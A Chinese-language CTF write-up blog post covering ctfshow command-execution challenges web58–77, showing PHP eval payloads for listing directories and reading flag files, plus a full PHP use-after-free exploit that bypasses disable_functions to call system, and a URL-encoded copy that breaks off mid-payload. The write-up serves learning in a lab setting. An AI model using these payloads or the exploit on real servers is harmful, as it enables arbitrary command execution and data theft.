<!DOCTYPE html>
<html data-theme="">
<head>
    <!-- ! 引用文件位置-->
    <!--引用文件位置-->
<meta charset="utf-8">
<title>Hacked by Natro92.</title>
<!--    daisyui cdn-->
<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
<!--     tailwindcss cdn daisyui 前置-->
<script src="https://cdn.tailwindcss.com"></script>
<!--    更改主题颜色-->
<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
<!--自动排版-->
<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
<!--    谷歌字体库镜像-->
<style>
    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
</style>
<!--jquery-->
<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
<!--    fancybox-->
<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
<!--highlight 代码高亮 使用hexo的不会高亮-->
<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
<script>
    hljs.highlightAll();
</script>
<link rel="stylesheet"
      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
<!--LeanCLoud-->
<script src="https://cdn.jsdelivr.net/npm/leancloud-storage@4.15.2/dist/av.min.js"></script>
<!--卜算子busuanzi-->
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!--    自定义css-->

<link rel="stylesheet" href="/css/output.css">


<link rel="stylesheet" href="/css/style.css">

<!--    自定义js-->

<script src="/js/view.js"></script>


<script src="/js/fancybox.js"></script>


<script src="/js/search.js"></script>

<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
<meta name="referrer" content="no-referrer"/>
<link rel="shortcut icon" href="static/favicon.ico">
<meta name="generator" content="Hexo 7.0.0"></head>
<body>
<!--导航栏-->
<div class="fixed z-10 w-full">
    <div class="container-nav justify-center flex">
        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
            <div class="flex-1">
                <a class="btn btn-ghost text-xl" href="/">Natro92&#39;s Site</a>
            </div>
            <div class="flex-none gap-2">
                <ul class="menu menu-horizontal px-1">
                    
                    
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/">首页</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/blogs">归档</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/tags">标签</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/categories">分类</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/link">更多</a></li>
                        
                    
                    <!--<li><a href="/">Home</a></li>-->
                    <!--<li><a href="/blogs">Archive</a></li>-->
                    <!--<li><a href="/about/">About</a></li>-->
                    <li>
                        <details class="dropdown">
                            <summary>
                                更换主题
                            </summary>
                            <ul tabindex="0"
                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
                                <!--主题选择配置，主题来自daisyui-->

<li><a data-set-theme="light">Light</a></li>
<li><a data-set-theme="dark">Night</a></li>
<li><a data-set-theme="cupcake">Cupcake</a></li>
<li><a data-set-theme="bumblebee">Bumblebee</a></li>
<li><a data-set-theme="emerald">Emerald</a></li>
<li><a data-set-theme="coporate">Corporate</a></li>
<li><a data-set-theme="synthwave">Synthwave</a></li>
<li><a data-set-theme="retro">Retro</a></li>
<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
<li><a data-set-theme="halloween">Halloween</a></li>
<li><a data-set-theme="garden">Garden</a></li>
<li><a data-set-theme="forest">Forest</a></li>
<li><a data-set-theme="aqua">Aqua</a></li>
<li><a data-set-theme="lofi">Lo-fi</a></li>
<li><a data-set-theme="pastel">Pastel</a></li>
<li><a data-set-theme="fantasy">Fantasy</a></li>
<li><a data-set-theme="wireframe">Wireframe</a></li>
<li><a data-set-theme="black">Black</a></li>
<li><a data-set-theme="luxury">Luxury</a></li>
<li><a data-set-theme="dracula">Dracula</a></li>
<li><a data-set-theme="cmyk">CMYK</a></li>
<li><a data-set-theme="autumn">Autumn</a></li>
<li><a data-set-theme="business">Business</a></li>
<li><a data-set-theme="acid">Acid</a></li>
<li><a data-set-theme="lemonade">Lemonade</a></li>
<li><a data-set-theme="night">Night</a></li>
<li><a data-set-theme="coffee">Coffee</a></li>
<li><a data-set-theme="winter">Winter</a></li>
<li><a data-set-theme="dim">Dim</a></li>
<li><a data-set-theme="nord">Nord</a></li>
<li><a data-set-theme="sunset">Sunset</a></li>
                            </ul>
                        </details>
                    </li>
                </ul>
                <div class="form-control">

                    <input type="text" placeholder="Search it!" id="local-search-input"
                           class="st-search-input input input-bordered w-24 md:w-auto rounded-xl"/>
                    <div id="local-search-result" class="local-search-result-cls rounded-xl"></div>
                    <script type="text/javascript" id="local.search.active">
                        var inputArea = document.querySelector("#local-search-input");
                        inputArea.onclick = function () {
                            getSearchFile();
                            this.onclick = null
                        }
                        inputArea.onkeydown = function () {
                            if (event.keyCode === 13) return false
                        }
                    </script>
                </div>
                <div class="dropdown dropdown-end">
                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
                        <div class="w-10 rounded-full">
                            <a target="_blank" rel="noopener" href="https://github.com/natro92">
                                <img alt="Tailwind CSS Navbar component"
                                     src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1706006117478-a75e82ba-dea0-46bd-be3b-fa82cb80209c.png"/>
                            </a>
                        </div>
                    </div>
                    <!--TODO 完成这里-->
                    <!--<ul tabindex="0"-->
                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
                    <!--    <li>-->
                    <!--        <a class="justify-between">-->
                    <!--            Profile-->
                    <!--            <span class="badge">New</span>-->
                    <!--        </a>-->
                    <!--    </li>-->
                    <!--    <li><a>Settings</a></li>-->
                    <!--    <li><a>Logout</a></li>-->
                    <!--</ul>-->
                </div>
            </div>
        </div>
    </div>
</div>
<!--导航栏结束-->
<div class="h-36 w-full"></div>
<div class="fleet">
    <!--    嵌套位置-->
    <!-- 博客详情 -->


<!--Post开始-->
<div class="fleet container-nav justify-center flex mb-16 w-full">
    <div class="w-8/12 justify-center flex">
        <div class="fleet-body flex-col w-full">
            <div class="fleet-header">
                <div class="fleet-content-header-title text-6xl">
                    <h1 class="inline-block font-extrabold mt-16 mb-8">web58-77命令执行篇（三）</h1>
                </div>
                <div class="fleet-content-header-info">
                    <span>2023/04/13 22:30:39</span>
                </div>
            </div>
            <div class="divider w-full"></div>
            <div class="fleet-content mt-8">
                <div class="fleet-content-body">
                    <div class="fleet-content-body-content justify-center flex w-full">
                        
                        <!--代码块-->
                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
                        
                        <!--图片-->
                        
                        <article class="prose">
                            <h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_POST[&#39;c&#39;]))&#123;
  $c&#x3D; $_POST[&#39;c&#39;];
  eval($c);
&#125;else&#123;
  highlight_file(__FILE__);
&#125;</code></pre>

<p>正常来说，看到这个格式，我们第一个想到的就是使用system然后命令执行，但是当我们尝试使用时会发现：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188042126-c8349447-3fd5-476b-9f44-6882c1d58843.png" alt="image.png"><br>这是因为php.ini配置中默认禁用了执行系统外部命令函数，但是这里我们可以用php内置函数来读取文件，因此这部分学习的时php相关函数的使用。<br>我们需要先查看当前目录。<code>c=print_r(glob(&quot;*&quot;));</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188390551-ccd0bc7e-f319-48f4-9048-e9709fe4a367.png" alt="image.png"><br>或者<code>c=print_r(scandir(&#39;.&#39;));</code>（注意两者的返回数组内容不同）<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188668314-11508ec5-a9c6-4805-a743-2b89641beb78.png" alt="image.png"><br>我们直接显示代码就行。<br>post传参，<code>c=highlight_file(&#39;flag.php&#39;);</code>或者<code>show_source(__FILE__);</code></p>
<h1 id="web59-65"><a href="#web59-65" class="headerlink" title="web59-65"></a>web59-65</h1><p>题可能出错了，和58一模一样…</p>
<h1 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h1><pre class="language-php" data-language="php"><code class="language-php">if(isset($_POST[&#39;c&#39;]))&#123;
  $c&#x3D; $_POST[&#39;c&#39;];
  eval($c);
&#125;else&#123;
  highlight_file(__FILE__);
&#125;</code></pre>

<p>show_source被禁用，highlight_file查看flag.php文件提示不在这里。<br>那么查看根目录文件发现flag.txt。<code>c=var_dump(scandir(&#39;/&#39;));</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680189387199-0ce00bd0-0d23-44e5-a511-2f3e9b96f24b.png" alt="image.png"><br>直接用highlight_file读文件。<code>c=highlight_file(&#39;/flag.txt&#39;);</code></p>
<h1 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h1><p>禁用了print_r<br><code>var_dump(scandir(&#39;/&#39;));</code><br><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p>
<h1 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h1><p>把highlight_file禁用了。但是其他的还可以用。<br><code>var_dump(scandir(&#39;/&#39;));</code>查看根目录文件。<br>我们还可以使用include、require函数来阅读文件：<code>require(&#39;/flag.txt&#39;);</code></p>
<h1 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h1><p>var_dump被禁用，但是google了一下类似函数，发现了<code>var_export</code>函数功能类似。<br><code>c=var_export(scandir(&#39;/&#39;));</code><br>读取根目录下文件。<code>require(&#39;/flag.txt&#39;);</code></p>
<h1 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h1><p><code>c=var_export(scandir(&#39;/&#39;));</code><br><code>require(&#39;/flag.txt&#39;);</code></p>
<h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><p>尝试读取根目录：<code>c=var_export(scandir(&#39;/&#39;));</code>但是发现出现如下情况：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680191189835-ec426ee9-4d83-4d74-b321-79bbe39b0de7.png" alt="image.png"><br>经过查询发现，这是php对缓冲区进行操作导致的。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39938855/article/details/115944594">https://blog.csdn.net/weixin_39938855&#x2F;article&#x2F;details&#x2F;115944594</a></p>
</blockquote>
<p>查看index.php后发现</p>
<pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);
ini_set(&#39;display_errors&#39;, 0);
&#x2F;&#x2F; 你们在炫技吗？
if(isset($_POST[&#39;c&#39;]))&#123;
        $c&#x3D; $_POST[&#39;c&#39;];
        eval($c);
        $s &#x3D; ob_get_contents();
        ob_end_clean();
        echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;

?&gt;</code></pre>

<p>原理就是ob_get_contents()和ob_end_clean();的执行，我们想办法让他后面的部分不执行即可，那么我们对payload后面加上<code>exit(0)</code>截断即可（或者die函数）<br><code>c=var_export(scandir(&#39;/&#39;));die(1);</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680191595296-540d251d-7abb-47f6-9f07-1ea8ef6685b7.png" alt="image.png"><br>这样文本就正常了。<br><code>require(&#39;/flag.txt&#39;);</code></p>
<h1 id="web72"><a href="#web72" class="headerlink" title="*web72"></a>*web72</h1><p>scandir函数被禁止了。</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
ini_set(&#39;display_errors&#39;, 0);
&#x2F;&#x2F; 你们在炫技吗？
if(isset($_POST[&#39;c&#39;]))&#123;
        $c&#x3D; $_POST[&#39;c&#39;];
        eval($c);
        $s &#x3D; ob_get_contents();
        ob_end_clean();
        echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;

?&gt;</code></pre>

<p>让我们看看wp是怎么解的吧。（水平一下又拔起来了。。。）<br>利用php脚本读取文件目录：（利用glob:&#x2F;&#x2F;伪协议绕过open_basedir）</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;?&gt;&lt;?php $a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);
foreach($a as $f)
&#123;echo($f-&gt;__toString().&#39; &#39;);
&#125;
exit(0);
?&gt;</code></pre>

<p><strong>这是访问根目录，如果想要访问网站目录为（相对路径）：</strong><code>**&quot;glob://./*&quot;**</code><br>因为scandir这些简单函数被禁用了，就需要我们手写函数来输出。<br>发现目录下有flag0.txt，那么直接尝试require来读取。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271902026-3d23f6a9-a78f-4a2f-a7c2-7e5ed8084dc7.png" alt="image.png"><br>但是发现这些读取函数被禁用了，没有读取权限。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271990810-7fa1a783-940b-48f6-8ef4-f07133f5c45e.png" alt="image.png"><br>uaf绕过open_basedir执行命令<br>poc（需要url编码）</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php

function ctfshow($cmd) &#123;
    global $abc, $helper, $backtrace;

    class Vuln &#123;
        public $a;
        public function __destruct() &#123; 
            global $backtrace; 
            unset($this-&gt;a);
            $backtrace &#x3D; (new Exception)-&gt;getTrace();
            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
                $backtrace &#x3D; debug_backtrace();
            &#125;
        &#125;
    &#125;

    class Helper &#123;
        public $a, $b, $c, $d;
    &#125;

    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;
        $address &#x3D; 0;
        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;
            $address &lt;&lt;&#x3D; 8;
            $address |&#x3D; ord($str[$p+$j]);
        &#125;
        return $address;
    &#125;

    function ptr2str($ptr, $m &#x3D; 8) &#123;
        $out &#x3D; &quot;&quot;;
        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;
            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
            $ptr &gt;&gt;&#x3D; 8;
        &#125;
        return $out;
    &#125;

    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;
        $i &#x3D; 0;
        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;
            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));
            $v &gt;&gt;&#x3D; 8;
        &#125;
    &#125;

    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak &#x3D; strlen($helper-&gt;a);
        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;
        return $leak;
    &#125;

    function parse_elf($base) &#123;
        $e_type &#x3D; leak($base, 0x10, 2);

        $e_phoff &#x3D; leak($base, 0x20);
        $e_phentsize &#x3D; leak($base, 0x36, 2);
        $e_phnum &#x3D; leak($base, 0x38, 2);

        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;
            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;
            $p_type  &#x3D; leak($header, 0, 4);
            $p_flags &#x3D; leak($header, 4, 4);
            $p_vaddr &#x3D; leak($header, 0x10);
            $p_memsz &#x3D; leak($header, 0x28);

            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; 

                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size &#x3D; $p_memsz;
            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; 
                $text_size &#x3D; $p_memsz;
            &#125;
        &#125;

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    &#125;

    function get_basic_funcs($base, $elf) &#123;
        list($data_addr, $text_size, $data_size) &#x3D; $elf;
        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;
            $leak &#x3D; leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                
                if($deref !&#x3D; 0x746e6174736e6f63)
                    continue;
            &#125; else continue;

            $leak &#x3D; leak($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
                $deref &#x3D; leak($leak);
                
                if($deref !&#x3D; 0x786568326e6962)
                    continue;
            &#125; else continue;

            return $data_addr + $i * 8;
        &#125;
    &#125;

    function get_binary_base($binary_leak) &#123;
        $base &#x3D; 0;
        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;
        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;
            $addr &#x3D; $start - 0x1000 * $i;
            $leak &#x3D; leak($addr, 0, 7);
            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;
                return $addr;
            &#125;
        &#125;
    &#125;

    function get_system($basic_funcs) &#123;
        $addr &#x3D; $basic_funcs;
        do &#123;
            $f_entry &#x3D; leak($addr);
            $f_name &#x3D; leak($f_entry, 0, 6);

            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;
                return leak($addr + 8);
            &#125;
            $addr +&#x3D; 0x20;
        &#125; while($f_entry !&#x3D; 0);
        return false;
    &#125;

    function trigger_uaf($arg) &#123;

        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
        $vuln &#x3D; new Vuln();
        $vuln-&gt;a &#x3D; $arg;
    &#125;

    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
        die(&#39;This PoC is for *nix systems only.&#39;);
    &#125;

    $n_alloc &#x3D; 10; 
    $contiguous &#x3D; [];
    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)
        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);

    trigger_uaf(&#39;x&#39;);
    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];

    $helper &#x3D; new Helper;
    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;

    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;
        die(&quot;UAF failed&quot;);
    &#125;

    $closure_handlers &#x3D; str2ptr($abc, 0);
    $php_heap &#x3D; str2ptr($abc, 0x58);
    $abc_addr &#x3D; $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj &#x3D; str2ptr($abc, 0x20);

    $binary_leak &#x3D; leak($closure_handlers, 8);
    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;
        die(&quot;Couldn&#39;t determine binary base address&quot;);
    &#125;

    if(!($elf &#x3D; parse_elf($base))) &#123;
        die(&quot;Couldn&#39;t parse ELF header&quot;);
    &#125;

    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;
        die(&quot;Couldn&#39;t get basic_functions address&quot;);
    &#125;

    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;
        die(&quot;Couldn&#39;t get zif_system address&quot;);
    &#125;


    $fake_obj_offset &#x3D; 0xd0;
    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    &#125;

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper-&gt;b)($cmd);
    exit();
&#125;

ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush();
?&gt;</code></pre>

<p>于是payload就是：</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#39;args&#39;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%2